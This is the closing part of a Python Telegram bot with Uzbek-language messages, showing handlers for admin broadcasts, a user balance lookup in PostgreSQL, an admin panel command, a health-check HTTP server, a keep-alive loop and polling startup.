        await message.answer(f"✅ Yuborildi: {sent} ta foydalanuvchiga", reply_markup=admin_menu)
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 16. BALANS KOMANDASI =================
@dp.message_handler(commands=['balance'])
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=user_menu)
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 17. ADMIN MENU QAYTARISH =================
@dp.message_handler(commands=['admin'])
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer(
            "👋 Admin panel",
            reply_markup=admin_menu
        )

# ================= HTTP SERVER =================
async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_http_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
        
        # HTTP server doimiy ishlashi uchun
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        logger.error(f"❌ HTTP server xatosi: {e}")

# ================= KEEP-ALIVE =================
async def keep_alive():
    while True:
        try:
            await bot.get_me()
            logger.info("📡 Ping yuborildi")
        except Exception as e:
            logger.error(f"❌ Ping xatosi: {e}")
        await asyncio.sleep(60)

# ================= MAIN =================
async def on_startup(dp):
    logger.info("🤖 Bot ishga tushmoqda...")
    
    try:
        await init_db()
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
    
    # HTTP serverni ishga tushirish
    asyncio.create_task(start_http_server())
    
    # Keep-alive funksiyasi
    asyncio.create_task(keep_alive())
    
    logger.info("✅ Bot tayyor!")

async def on_shutdown(dp):
    logger.info("🛑 Bot o'chmoqda...")
    try:
        await bot.close()
    except:
        pass
    logger.info("✅ Bot o'chdi")

# ================= ASOSIY ISHGA TUSHIRISH =================
if __name__ == "__main__":
    # Webhook o'rniga polling ishlatamiz
    # skip_updates=True - eski xabarlarni o'tkazib yuborish
    executor.start_polling(
        dp, 
        on_startup=on_startup, 
        on_shutdown=on_shutdown,
        skip_updates=True
    )
